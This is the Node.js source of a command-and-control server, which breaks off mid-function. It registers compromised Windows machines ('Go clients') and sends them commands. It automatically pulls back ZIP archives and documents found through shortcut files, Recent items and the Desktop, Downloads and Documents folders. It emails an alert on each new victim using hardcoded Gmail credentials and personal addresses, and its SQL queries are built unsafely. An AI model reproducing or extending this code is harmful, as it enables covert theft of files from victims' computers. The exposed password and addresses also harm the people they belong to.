require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const net = require('net');
const { v4: uuidv4 } = require('uuid');
const moment = require('moment');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const nodemailer = require('nodemailer');
const AdmZip = require('adm-zip');
const os = require('os');

const app = express();
const server = http.createServer(app);
const allowedOrigins = (process.env.CORS_ORIGIN || "http://localhost:3000")
  .split(',')
  .map(s => s.trim())
  .filter(Boolean);

const io = socketIo(server, {
  cors: {
    origin: allowedOrigins.length ? allowedOrigins : '*',
    methods: ["GET", "POST"],
    credentials: true
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('client/build'));

// File upload configuration
const upload = multer({ 
  dest: 'uploads/',
  limits: { fileSize: 100 * 1024 * 1024 } // 100MB limit
});

// Global variables
const clients = new Map();
const clientSessions = new Map();
const commandHistory = [];
const outputBuffer = [];

// Create uploads directory
fs.ensureDirSync('uploads');
fs.ensureDirSync('downloads');

// ============================================================
// SHORTCUT RESOLUTION FUNCTIONS
// ============================================================

/**
 * Parse Windows .lnk shortcut file to extract target path
 * This is a simplified parser for common .lnk files
 */
function parseLnkFile(lnkBuffer) {
  try {
    // Windows .lnk file structure (simplified)
    // Header: 76 bytes
    // LinkInfo starts at offset 0x4C (76)
    
    if (lnkBuffer.length < 76) return null;
    
    // Check for .lnk magic number (0x0000004C at offset 0)
    const magic = lnkBuffer.readUInt32LE(0);
    if (magic !== 0x0000004C) return null;
    
    // Get LinkFlags at offset 0x14
    const linkFlags = lnkBuffer.readUInt32LE(0x14);
    const hasLinkInfo = (linkFlags & 0x02) !== 0;
    
    if (!hasLinkInfo) return null;
    
    // Find LinkInfo offset (after header)
    let offset = 76; // Header size
    
    // Skip ShellItemIDList if present (bit 0 of LinkFlags)
    if ((linkFlags & 0x01) !== 0 && offset + 2 <= lnkBuffer.length) {
      const idListSize = lnkBuffer.readUInt16LE(offset);
      offset += 2 + idListSize;
    }
    
    // Read LinkInfo
    if (offset + 4 > lnkBuffer.length) return null;
    const linkInfoSize = lnkBuffer.readUInt32LE(offset);
    
    if (offset + linkInfoSize > lnkBuffer.length) return null;
    
    // LocalBasePath offset (at +0x10 from LinkInfo start)
    if (offset + 0x14 > lnkBuffer.length) return null;
    const localBasePathOffset = lnkBuffer.readUInt32LE(offset + 0x10);
    
    // Read the path string (null-terminated ASCII)
    const pathStart = offset + localBasePathOffset;
    if (pathStart >= lnkBuffer.length) return null;
    
    let pathEnd = pathStart;
    while (pathEnd < lnkBuffer.length && lnkBuffer[pathEnd] !== 0) {
      pathEnd++;
    }
    
    const targetPath = lnkBuffer.toString('ascii', pathStart, pathEnd);
    return targetPath || null;
  } catch (error) {
    console.error('[SHORTCUT] Error parsing .lnk file:', error);
    return null;
  }
}

/**
 * Resolve a single shortcut file
 * @param {string} shortcutPath - Path to the .lnk file
 * @param {string} clientId - Client ID
 * @param {Socket} socket - TCP socket to send download commands
 */
async function resolveSingleShortcut(shortcutPath, clientId, socket) {
  try {
    console.log(`[SHORTCUT] Processing single shortcut: ${shortcutPath}`);
    
    if (!fs.existsSync(shortcutPath)) {
      console.log(`[SHORTCUT] Shortcut file not found: ${shortcutPath}`);
      return;
    }
    
    const lnkBuffer = fs.readFileSync(shortcutPath);
    const targetPath = parseLnkFile(lnkBuffer);
    
    if (targetPath && fs.existsSync(targetPath)) {
      const shortcutName = path.basename(shortcutPath, '.lnk');
      const targetExt = path.extname(targetPath);
      const newFilename = `${shortcutName}_resolved${targetExt}`;
      
      console.log(`[SHORTCUT] Found shortcut: ${shortcutName} -> ${targetPath}`);
      
      io.emit('commandResponse', { 
        clientId, 
        response: `[SHORTCUT] Resolving: ${shortcutName} -> ${path.basename(targetPath)}`, 
        timestamp: new Date() 
      });
      
      // Send download command to client
      const downloadCmd = {
        type: 'command',
        content: `download ${targetPath}`
      };
      socket.write(JSON.stringify(downloadCmd) + '\n');
      
      // Mark as expecting download
      const client = clients.get(clientId);
      if (client) {
        client.pendingDownload = {
          inProgress: true,
          filename: newFilename,
          buffer: Buffer.alloc(0),
          timeout: null,
          originalShortcut: path.basename(shortcutPath),
          targetPath: targetPath
        };
      }
    } else {
      console.log(`[SHORTCUT] Could not resolve shortcut or target not found: ${shortcutPath}`);
      io.emit('commandResponse', { 
        clientId, 
        response: `[SHORTCUT] Could not resolve: ${path.basename(shortcutPath)}`, 
        timestamp: new Date() 
      });
    }
  } catch (error) {
    console.error('[SHORTCUT] Error processing single shortcut:', error);
    io.emit('commandResponse', { 
      clientId, 
      response: `[SHORTCUT] Error: ${error.message}`, 
      timestamp: new Date() 
    });
  }
}

/**
 * Extract ZIP and find all document paths to download
 * @param {string} zipPath - Path to the ZIP file
 * @param {string} clientId - Client ID
 * @param {Socket} socket - TCP socket to send download commands
 */
async function extractAndResolveShortcuts(zipPath, clientId, socket) {
  try {
    console.log(`[EXTRACTION] Processing ZIP file: ${zipPath}`);
    
    // Try to read ZIP even if corrupted
    let zip;
    try {
      zip = new AdmZip(zipPath);
    } catch (zipError) {
      console.log(`[EXTRACTION] ZIP might be corrupted, attempting repair...`);
      // Try reading with lenient mode
      try {
        zip = new AdmZip(zipPath, { noCompress: true });
      } catch (e) {
        console.error(`[EXTRACTION] Cannot read ZIP file: ${e.message}`);
        io.emit('commandResponse', { 
          clientId, 
          response: `[EXTRACTION] ZIP file corrupted and cannot be repaired. Skipping extraction.`, 
          timestamp: new Date() 
        });
        return;
      }
    }
    
    const zipEntries = zip.getEntries();
    const itemsToDownload = [];
    
    console.log(`[EXTRACTION] ZIP contains ${zipEntries.length} entries`);
    
    // Process all entries in the ZIP
    for (const entry of zipEntries) {
      try {
        const entryName = entry.entryName.toLowerCase();
        
        // 1. Handle .lnk shortcuts
        if (entryName.endsWith('.lnk')) {
          const lnkBuffer = entry.getData();
          const targetPath = parseLnkFile(lnkBuffer);
          
          if (targetPath) {
            itemsToDownload.push({
              type: 'shortcut',
              originalName: entry.entryName,
              targetPath: targetPath,
              displayName: path.basename(entry.entryName, '.lnk')
            });
            console.log(`[EXTRACTION] Shortcut found: ${entry.entryName} -> ${targetPath}`);
          }
        }
        
        // 2. Scan text files for file paths (Recent items, etc.)
        else if (entryName.includes('recent') || entryName.endsWith('.txt') || entryName.endsWith('.dat')) {
          try {
            const content = entry.getData().toString('utf-8');
            // Look for Windows file paths in content
            const pathRegex = /([A-Z]:\\(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]+\.(?:pdf|docx?|xlsx?|pptx?|txt|rtf))/gi;
            const matches = content.match(pathRegex);
            
            if (matches) {
              for (const filePath of matches) {
                // Check if it's a document type we want
                const ext = path.extname(filePath).toLowerCase();
                if (['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf'].includes(ext)) {
                  itemsToDownload.push({
                    type: 'referenced',
                    originalName: entry.entryName,
                    targetPath: filePath,
                    displayName: path.basename(filePath, ext)
                  });
                  console.log(`[EXTRACTION] Document reference found in ${entry.entryName}: ${filePath}`);
                }
              }
            }
          } catch (e) {
            // Skip if can't read as text
          }
        }
      } catch (error) {
        console.error(`[EXTRACTION] Error processing ${entry.entryName}:`, error.message);
      }
    }
    
    // Also scan common system locations for documents
    const systemLocations = [
      'Desktop',
      'Downloads',
      'Documents',
      'Recent'
    ];
    
    io.emit('commandResponse', { 
      clientId, 
      response: `[EXTRACTION] Scanning system folders for documents...`, 
      timestamp: new Date() 
    });
    
    for (const location of systemLocations) {
      // Request directory listing
      const listCmd = {
        type: 'command',
        content: `ls %USERPROFILE%\\${location}`
      };
      socket.write(JSON.stringify(listCmd) + '\n');
      
      // Wait for response
      await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    // Remove duplicates
    const uniquePaths = new Set();
    const uniqueItems = itemsToDownload.filter(item => {
      if (uniquePaths.has(item.targetPath.toLowerCase())) {
        return false;
      }
      uniquePaths.add(item.targetPath.toLowerCase());
      return true;
    });
    
    // Download all items
    if (uniqueItems.length > 0) {
      console.log(`[EXTRACTION] Found ${uniqueItems.length} items to download`);
      
      io.emit('commandResponse', { 
        clientId, 
        response: `\n[EXTRACTION] Found ${uniqueItems.length} items (shortcuts + documents). Downloading...`, 
        timestamp: new Date() 
      });
      
      // Download each item
      for (const item of uniqueItems) {
        const targetPath = item.targetPath;
        const targetExt = path.extname(targetPath);
        const newFilename = `${item.displayName}_resolved${targetExt}`;
        
        console.log(`[EXTRACTION] Requesting: ${targetPath}`);
        
        io.emit('commandResponse', { 
          clientId, 
          response: `[EXTRACTION] Downloading: ${item.displayName}${targetExt}`, 
          timestamp: new Date() 
        });
        
        // Send download command to client
        const downloadCmd = {
          type: 'command',
          content: `download ${targetPath}`
        };
        socket.write(JSON.stringify(downloadCmd) + '\n');
        
        // Mark as expecting download
        const client = clients.get(clientId);
        if (client) {
          client.pendingDownload = {
            inProgress: true,
            filename: newFilename,
            buffer: Buffer.alloc(0),
            timeout: null,
            originalName: item.originalName,
            targetPath: targetPath
          };
        }
        
        // Wait between downloads
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    } else {
      console.log(`[EXTRACTION] No shortcuts or document references found in ZIP`);
      io.emit('commandResponse', { 
        clientId, 
        response: `[EXTRACTION] No shortcuts or document references found`, 
        timestamp: new Date() 
      });
    }
  } catch (error) {
    console.error('[EXTRACTION] Error processing ZIP:', error);
    io.emit('commandResponse', { 
      clientId, 
      response: `[EXTRACTION] Error: ${error.message}`, 
      timestamp: new Date() 
    });
  }
}

// SQLite setup for persistent settings using sql.js (pure JS, no native build)
const initSqlJs = require('sql.js');
const dbPath = path.join(__dirname, 'c2.sqlite');
let SQL = null;
let db = null;
const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret';

async function loadDb() {
  if (!SQL) {
    SQL = await initSqlJs();
  }
  if (!db) {
    if (fs.existsSync(dbPath)) {
      const filebuffer = fs.readFileSync(dbPath);
      db = new SQL.Database(filebuffer);
    } else {
      db = new SQL.Database();
      db.run(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);`);
      db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
      persistDb();
    }
    // Ensure tables exist when upgrading
    db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
    
    // Create client history tables
    db.run(`CREATE TABLE IF NOT EXISTS clients (
      id TEXT PRIMARY KEY,
      hostname TEXT NOT NULL,
      username TEXT NOT NULL,
      os TEXT NOT NULL,
      ip TEXT NOT NULL,
      macAddress TEXT,
      firstSeen TEXT NOT NULL,
      lastSeen TEXT NOT NULL,
      totalConnections INTEGER DEFAULT 1,
      status TEXT DEFAULT 'offline'
    );`);
    
    db.run(`CREATE TABLE IF NOT EXISTS client_sessions (
      sessionId TEXT PRIMARY KEY,
      clientId TEXT NOT NULL,
      connectTime TEXT NOT NULL,
      disconnectTime TEXT,
      ipAddress TEXT,
      duration INTEGER,
      FOREIGN KEY (clientId) REFERENCES clients(id)
    );`);
    
    db.run(`CREATE TABLE IF NOT EXISTS client_commands (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      clientId TEXT NOT NULL,
      sessionId TEXT,
      command TEXT NOT NULL,
      timestamp TEXT NOT NULL,
      response TEXT,
      FOREIGN KEY (clientId) REFERENCES clients(id),
      FOREIGN KEY (sessionId) REFERENCES client_sessions(sessionId)
    );`);
    
    persistDb();
  }
}

function persistDb() {
  const data = db.export();
  const buffer = Buffer.from(data);
  fs.writeFileSync(dbPath, buffer);
}

const defaultSettings = {
  serverPort: 2026,
  serverHost: '0.0.0.0',
  maxClients: 100,
  heartbeatInterval: 60,
  logLevel: 'info',
  autoReconnect: true,
  encryptionEnabled: true,
  stealthMode: true,
  logFile: './logs/c2.log',
  backupInterval: 24,
  emailEnabled: true,
  emailHost: 'smtp.gmail.com',
  emailPort: 587,
  emailSecure: false,
  emailUser: 'fahis00786@gmail.com',
  emailPass: 'xabadhtihzjnitxx',
  emailFrom: 'fahis00786@gmail.com',
  emailTo: ['zararanwar1234321@gmail.com','qaziwaseem4zetabytes@gmail.com'],
  emailSubject: 'Fahis Connection Alert'
};

function getAllSettings() {
  const out = { ...defaultSettings };
  const stmt = db.prepare('SELECT key, value FROM settings');
  const rows = [];
  while (stmt.step()) {
    rows.push(stmt.getAsObject());
  }
  rows.forEach(r => {
    try { out[r.key] = JSON.parse(r.value); } catch { out[r.key] = r.value; }
  });
  return out;
}

function setSettings(partial) {
  const insert = db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
  db.run('BEGIN');
  try {
    Object.entries(partial).forEach(([k, v]) => insert.run([k, JSON.stringify(v)]));
    db.run('COMMIT');
  } catch (e) {
    db.run('ROLLBACK');
    throw e;
  }
  persistDb();
}

function getSetting(key, defaultValue) {
  const stmt = db.prepare('SELECT value FROM settings WHERE key = ?');
  const row = stmt.getAsObject([key]);
  if (row && row.value) {
    try { return JSON.parse(row.value); } catch { return row.value; }
  }
  return defaultValue;
}

function ensureDefaultSettings() {
  // Insert defaults only for missing keys
  const existing = new Set();
  const stmt = db.prepare('SELECT key FROM settings');
  while (stmt.step()) {
    const row = stmt.getAsObject();
    if (row && row.key) existing.add(row.key);
  }
  const missing = {};
  Object.entries(defaultSettings).forEach(([k, v]) => {
    if (!existing.has(k)) missing[k] = v;
  });
  if (Object.keys(missing).length > 0) setSettings(missing);
}

// Email functionality
let emailTransporter = null;

function createEmailTransporter() {
  const settings = getAllSettings();
  if (!settings.emailEnabled || !settings.emailUser || !settings.emailPass) {
    return null;
  }

  return nodemailer.createTransport({
    host: settings.emailHost,
    port: settings.emailPort,
    secure: settings.emailSecure,
    auth: {
      user: settings.emailUser,
      pass: settings.emailPass
    }
  });
}

async function sendConnectionAlert(clientInfo) {
  const settings = getAllSettings();
  console.log('[EMAIL] Checking email settings:', {
    enabled: settings.emailEnabled,
    user: settings.emailUser,
    to: settings.emailTo,
    host: settings.emailHost
  });
  
  if (!settings.emailEnabled || !settings.emailTo || settings.emailTo.length === 0) {
    console.log('[EMAIL] Email disabled or no recipients configured');
    return;
  }

  if (!emailTransporter) {
    emailTransporter = createEmailTransporter();
    if (!emailTransporter) {
      console.log('[EMAIL] Email not configured properly');
      return;
    }
  }

  const emailContent = `
    <h2>🚨 Fahis Connection Alert</h2>
    <p>A new client has connected to your C2 server.</p>
    
    <h3>Client Details:</h3>
    <ul>
      <li><strong>Hostname:</strong> ${clientInfo.hostname || 'Unknown'}</li>
      <li><strong>Username:</strong> ${clientInfo.username || 'Unknown'}</li>
      <li><strong>IP Address:</strong> ${clientInfo.ip || 'Unknown'}</li>
      <li><strong>MAC Address:</strong> ${clientInfo.macAddress || 'Unknown'}</li>
      <li><strong>Connected At:</strong> ${clientInfo.connectedAt ? new Date(clientInfo.connectedAt).toLocaleString() : 'Unknown'}</li>
    </ul>
    
    <h3>Server Information:</h3>
    <ul>
      <li><strong>Server Time:</strong> ${new Date().toLocaleString()}</li>
      <li><strong>Total Active Clients:</strong> ${clients.size}</li>
    </ul>
    
    <hr>
  `;

  const mailOptions = {
    from: settings.emailFrom || settings.emailUser,
    to: settings.emailTo.join(', '),
    subject: settings.emailSubject,
    html: emailContent
  };

  try {
    console.log('[EMAIL] Attempting to send email with options:', {
      from: mailOptions.from,
      to: mailOptions.to,
      subject: mailOptions.subject
    });
    
    const info = await emailTransporter.sendMail(mailOptions);
    console.log(`[EMAIL] Connection alert sent successfully: ${info.messageId}`);
  } catch (error) {
    console.error('[EMAIL] Failed to send connection alert:', error);
    console.error('[EMAIL] Error details:', {
      code: error.code,
      command: error.command,
      response: error.response
    });
  }
}

// Initialize DB before using
(async () => {
  await loadDb();
  ensureDefaultSettings();
})();

// ============================================================
// CLIENT HISTORY DATABASE FUNCTIONS
// ============================================================

/**
 * Save or update client in database
 */
function saveClientToDb(clientInfo) {
  try {
    const now = new Date().toISOString();
    
    // Check if client already exists
    const existing = db.exec(`SELECT * FROM clients WHERE id = '${clientInfo.id}'`);
    
    if (existing.length > 0 && existing[0].values.length > 0) {
      // Update existing client
      db.run(`UPDATE clients SET 
        lastSeen = '${now}',
        totalConnections = totalConnections + 1,
        status = 'online',
        ip = '${clientInfo.ip || 'unknown'}',
        hostname = '${clientInfo.hostname || 'unknown'}',
        username = '${clientInfo.username || 'unknown'}',
        os = '${clientInfo.os || 'unknown'}',
        macAddress = '${clientInfo.macAddress || 'unknown'}'
        WHERE id = '${clientInfo.id}'`);
    } else {
      // Insert new client
      db.run(`INSERT INTO clients (id, hostname, username, os, ip, macAddress, firstSeen, lastSeen, totalConnections, status)
        VALUES (
          '${clientInfo.id}',
          '${clientInfo.hostname || 'unknown'}',
          '${clientInfo.username || 'unknown'}',
          '${clientInfo.os || 'unknown'}',
          '${clientInfo.ip || 'unknown'}',
          '${clientInfo.macAddress || 'unknown'}',
          '${now}',
          '${now}',
          1,
          'online'
        )`);
    }
    
    persistDb();
    console.log(`[DB] Client saved: ${clientInfo.id} (${clientInfo.hostname})`);
  } catch (error) {
    console.error('[DB] Error saving client:', error);
  }
}

/**
 * Create new session for client
 */
function createClientSession(clientId, sessionId, ipAddress) {
  try {
    const now = new Date().toISOString();
    
    db.run(`INSERT INTO client_sessions (sessionId, clientId, connectTime, ipAddress)
      VALUES ('${sessionId}', '${clientId}', '${now}', '${ipAddress || 'unknown'}')`);
    
    persistDb();
    console.log(`[DB] Session created: ${sessionId} for client ${clientId}`);
  } catch (error) {
    console.error('[DB] Error creating session:', error);
  }
}

/**
 * Close client session
 */
function closeClientSession(sessionId) {
  try {
    const now = new Date().toISOString();
    
    // Get session start time
    const session = db.exec(`SELECT connectTime FROM client_sessions WHERE sessionId = '${sessionId}'`);
    
    if (session.length > 0 && session[0].values.length > 0) {
      const connectTime = new Date(session[0].values[0][0]);
      const disconnectTime = new Date(now);
      const duration = Math.floor((disconnectTime - connectTime) / 1000); // Duration in seconds
      
      db.run(`UPDATE client_sessions SET 
        disconnectTime = '${now}',
        duration = ${duration}
        WHERE sessionId = '${sessionId}'`);
      
      persistDb();
      console.log(`[DB] Session closed: ${sessionId} (Duration: ${duration}s)`);
    }
  } catch (error) {
    console.error('[DB] Error closing session:', error);
  }
}

/**
 * Mark client as offline
 */
function markClientOffline(clientId) {
  try {
    db.run(`UPDATE clients SET status = 'offline' WHERE id = '${clientId}'`);
    persistDb();
    console.log(`[DB] Client marked offline: ${clientId}`);
  } catch (error) {
    console.error('[DB] Error marking client offline:', error);
  }
}

/**
 * Log client command
 */
function logClientCommand(clientId, sessionId, command, response = null) {
  try {
    const now = new Date().toISOString();
    const safeCommand = command.replace(/'/g, "''"); // Escape single quotes
    const safeResponse = response ? response.substring(0, 1000).replace(/'/g, "''") : null; // Limit response size
    
    db.run(`INSERT INTO client_commands (clientId, sessionId, command, timestamp, response)
      VALUES ('${clientId}', '${sessionId}', '${safeCommand}', '${now}', ${safeResponse ? `'${safeResponse}'` : 'NULL'})`);
    
    persistDb();
  } catch (error) {
    console.error('[DB] Error logging command:', error);
  }
}

/**
 * Get all clients from database
 */
function getAllClientsFromDb() {
  try {
    const result = db.exec(`SELECT * FROM clients ORDER BY lastSeen DESC`);
    
    if (result.length > 0 && result[0].values.length > 0) {
      const columns = result[0].columns;
      const values = result[0].values;
      
      return values.map(row => {
        const client = {};
        columns.forEach((col, index) => {
          client[col] = row[index];
        });
        return client;
      });
    }
    
    return [];
  } catch (error) {
    console.error('[DB] Error getting clients:', error);
    return [];
  }
}

/**
 * Get client history
 */
function getClientHistory(clientId) {
  try {
    const sessions = db.exec(`SELECT * FROM client_sessions WHERE clientId = '${clientId}' ORDER BY connectTime DESC LIMIT 50`);
    const commands = db.exec(`SELECT * FROM client_commands WHERE clientId = '${clientId}' ORDER BY timestamp DESC LIMIT 100`);
    
    const result = {
      sessions: [],
      commands: []
    };
    
    if (sessions.length > 0 && sessions[0].values.length > 0) {
      const cols = sessions[0].columns;
      result.sessions = sessions[0].values.map(row => {
        const session = {};
        cols.forEach((col, index) => {
          session[col] = row[index];
        });
        return session;
      });
    }
    
    if (commands.length > 0 && commands[0].values.length > 0) {
      const cols = commands[0].columns;
      result.commands = commands[0].values.map(row => {
        const command = {};
        cols.forEach((col, index) => {
          command[col] = row[index];
        });
        return command;
      });
    }
    
    return result;
  } catch (error) {
    console.error('[DB] Error getting client history:', error);
    return { sessions: [], commands: [] };
  }
}

// TCP Server for Go clients
let tcpServer = null;

function createTcpServer() {
  if (tcpServer) return tcpServer;
  tcpServer = net.createServer((socket) => {
  const clientId = uuidv4();
  const clientIP = socket.remoteAddress;
  
  console.log(`[TCP] New client connected: ${clientIP}`);
  
  // Buffer for incomplete messages
  let messageBuffer = '';
  
  socket.on('data', (data) => {
    try {
      // If there is a pending download for this client, treat incoming bytes as file data
      const c = clients.get(clientId);
      if (c && c.pendingDownload && c.pendingDownload.inProgress) {
        const pd = c.pendingDownload;
        pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), data]);
        if (pd.timeout) clearTimeout(pd.timeout);
        pd.timeout = setTimeout(async () => {
          try {
            const filename = path.basename(pd.filename || `download_${Date.now()}`);
            const downloadPath = path.join('downloads', filename);
            fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
            console.log(`[TCP] File downloaded: ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
            io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
            // Also emit a terminal-friendly message
            io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
            
            // Check if this is a ZIP file with shortcut resolution enabled
            if (pd.resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
              console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
              // Process shortcuts in the background
              setTimeout(() => {
                extractAndResolveShortcuts(downloadPath, clientId, socket);
              }, 3000); // Wait 3 seconds after ZIP download
            }
            // Check if this is a single .lnk file
            else if (filename.toLowerCase().endsWith('.lnk')) {
              console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
              // Process single shortcut in the background
              setTimeout(() => {
                resolveSingleShortcut(downloadPath, clientId, socket);
              }, 1000); // Wait 1 second after shortcut download
            }
          } catch (e) {
            console.error('[TCP] Error saving downloaded file:', e);
            io.emit('commandResponse', { clientId, response: `Download save failed: ${e.message}`, timestamp: new Date() });
          } finally {
            // clear state
            if (c.pendingDownload && c.pendingDownload.timeout) clearTimeout(c.pendingDownload.timeout);
            c.pendingDownload = null;
          }
        }, 2000);
        return;
      }
      
      // Add new data to buffer
      messageBuffer += data.toString();
      
      // Process complete messages (separated by newlines)
      const lines = messageBuffer.split('\n');
      messageBuffer = lines.pop(); // Keep the last incomplete line in buffer
      
      for (const line of lines) {
        if (line.trim() === '') continue; // Skip empty lines
        
        // If this looks like non-JSON (e.g., binary/text header), and a download is pending, treat as file bytes
        const client = clients.get(clientId);
        if (client && client.pendingDownload && client.pendingDownload.inProgress && (line[0] !== '{' || line.indexOf('"') === -1)) {
          const pd = client.pendingDownload;
          const chunk = Buffer.from(line, 'binary');
          pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), chunk]);
          if (pd.timeout) clearTimeout(pd.timeout);
          pd.timeout = setTimeout(async () => {
            try {
              const filename = path.basename(pd.filename || `download_${Date.now()}`);
              const downloadPath = path.join('downloads', filename);
              fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
              console.log(`[TCP] File downloaded (text-split path): ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
              io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
              io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
              
              // Check if this is a ZIP file with shortcut resolution enabled
              if (pd.resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
                console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
                // Process shortcuts in the background
                setTimeout(() => {
                  extractAndResolveShortcuts(downloadPath, clientId, socket);
                }, 3000); // Wait 3 seconds after ZIP download
              }
              // Check if this is a single .lnk file
              else if (filename.toLowerCase().endsWith('.lnk')) {
                console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
                // Process single shortcut in the background
                setTimeout(() => {
                  resolveSingleShortcut(downloadPath, clientId, socket);
                }, 1000); // Wait 1 second after shortcut download
              }
            } catch (e) {
              console.error('[TCP] Error saving downloaded file (text-split):', e);
              io.emit('commandResponse', { clientId, response: `Download save failed: ${e.message}`, timestamp: new Date() });
            } finally {
              if (client.pendingDownload && client.pendingDownload.timeout) clearTimeout(client.pendingDownload.timeout);
              client.pendingDownload = null;
            }
          }, 500);
          continue;
        }

        try {
          const raw = JSON.parse(line);
          const message = {
            // unify keys from Go (capitalized) and JS (lowercase)
            type: raw.type || raw.Type,
            content: raw.content || raw.Content,
            hostname: raw.hostname || raw.Hostname,
            macAddress: raw.macAddress || raw.MACAddress,
            username: raw.username || raw.Username
          };
          
          // Process the message
      if (message.hostname) {
        // Initial client info
        const clientInfo = {
          id: clientId,
          ip: clientIP,
          hostname: message.hostname,
          macAddress: message.macAddress,
          username: message.username,
          os: message.os || 'Unknown',
          socket: socket,
          connectedAt: new Date(),
          lastSeen: new Date(),
          active: true,
          sessionId: uuidv4()
        };
        
        clients.set(clientId, clientInfo);
        clientSessions.set(clientId, []);
        
        // Save to database
        saveClientToDb(clientInfo);
        createClientSession(clientId, clientInfo.sessionId, clientIP);
        
        console.log(`[TCP] Client registered: ${clientInfo.hostname} (${clientInfo.username})`);
        
        // Send email notification
        sendConnectionAlert(clientInfo).catch(err => {
          console.error('[EMAIL] Failed to send connection alert:', err);
        });
        
        // Notify GUI clients
        io.emit('clientConnected', {
          id: clientId,
          hostname: clientInfo.hostname,
          username: clientInfo.username,
          macAddress: clientInfo.macAddress,
          ip: clientInfo.ip,
          connectedAt: clientInfo.connectedAt
        });

        // Also broadcast refreshed clients list to ensure dashboard reflects the connection
        const list = Array.from(clients.values()).map(c => ({
          id: c.id,
          hostname: c.hostname,
          username: c.username,
          macAddress: c.macAddress,
          ip: c.ip,
          connectedAt: c.connectedAt,
          lastSeen: c.lastSeen,
          active: c.active
        }));
        io.emit('clientsList', list);
      } else if (message.type === 'response') {
        // Command response
        const client = clients.get(clientId);
        if (client) {
          client.lastSeen = new Date();
          
          // If the client reports a failure, clear pending download state
          if (message.content && message.content.toLowerCase().includes('download') && message.content.toLowerCase().includes('failed')) {
            if (client.pendingDownload) {
              if (client.pendingDownload.timeout) clearTimeout(client.pendingDownload.timeout);
              client.pendingDownload = null;
            }
          }

          // Auto-detect extract result and trigger download
          if (message.content.includes('AUTO_EXTRACT_START') && message.content.includes('ZIP FILE LOCATIONS')) {
            // Extract the full ZIP path from the client output (dynamic path detection)
            const zipPathMatch = message.content.match(/ZIP FILE LOCATIONS?:\s*([^\n\r]+)/i);
            if (zipPathMatch) {
              const zipPath = zipPathMatch[1].trim();
              console.log(`[TCP] Auto-detected ZIP: ${zipPath}. Triggering download...`);

              // Send download command
              const downloadCmd = {
                type: 'command',
                content: `download ${zipPath}`
              };
              socket.write(JSON.stringify(downloadCmd) + '\n');

              // Mark as expecting download with shortcut resolution flag
              client.pendingDownload = {
                inProgress: true,
                filename: zipPath,
                buffer: Buffer.alloc(0),
                timeout: null,
                resolveShortcuts: true, // Enable shortcut resolution for extracted files
                clientId: clientId,
                socket: socket
              };

              // Notify GUI and console
              io.emit('commandResponse', { clientId, response: `Auto-download initiated: ${zipPath}`, timestamp: new Date() });
              console.log(`[TCP] Auto-downloading ZIP from ${client.hostname}`);
            } else {
              // Fallback: try to extract just the filename and construct path
              const zipMatch = message.content.match(/data_[a-f0-9]+\.zip/);
              if (zipMatch) {
                // Try common Windows temp paths
                const possiblePaths = [
                  `C:\\Users\\${client.username || 'ADMIN'}\\AppData\\Local\\Temp\\${zipMatch[0]}`,
                  `C:\\Users\\${client.hostname}\\AppData\\Local\\Temp\\${zipMatch[0]}`,
                  `C:\\Windows\\Temp\\${zipMatch[0]}`,
                  `C:\\Temp\\${zipMatch[0]}`
                ];
                
                const zipPath = possiblePaths[0]; // Use first fallback
                console.log(`[TCP] Fallback ZIP path: ${zipPath}. Triggering download...`);

                const downloadCmd = {
                  type: 'command',
                  content: `download ${zipPath}`
                };
                socket.write(JSON.stringify(downloadCmd) + '\n');

                client.pendingDownload = {
                  inProgress: true,
                  filename: zipPath,
                  buffer: Buffer.alloc(0),
                  timeout: null
                };

                io.emit('commandResponse', { clientId, response: `Auto-download initiated (fallback): ${zipPath}`, timestamp: new Date() });
                console.log(`[TCP] Auto-downloading ZIP from ${client.hostname} (fallback)`);
              } else {
                console.log('[TCP] No ZIP path found in extract result');
              }
            }
          }
          
          // Store in session history
          const session = clientSessions.get(clientId) || [];
          session.push({
            timestamp: new Date(),
            type: 'response',
            content: message.content
          });
          clientSessions.set(clientId, session);
          
          // Notify GUI clients
          io.emit('commandResponse', {
            clientId: clientId,
            response: message.content,
            timestamp: new Date()
          });
        }
      } else if (message.type === 'heartbeat') {
        // Heartbeat response
        const client = clients.get(clientId);
        if (client) {
          client.lastSeen = new Date();
        }
      }
        } catch (parseError) {
          console.error(`[TCP] Error parsing JSON from ${clientIP}:`, parseError);
          // Skip this malformed message and continue
        }
      }
    } catch (error) {
      console.error(`[TCP] Error processing data from ${clientIP}:`, error);
    }
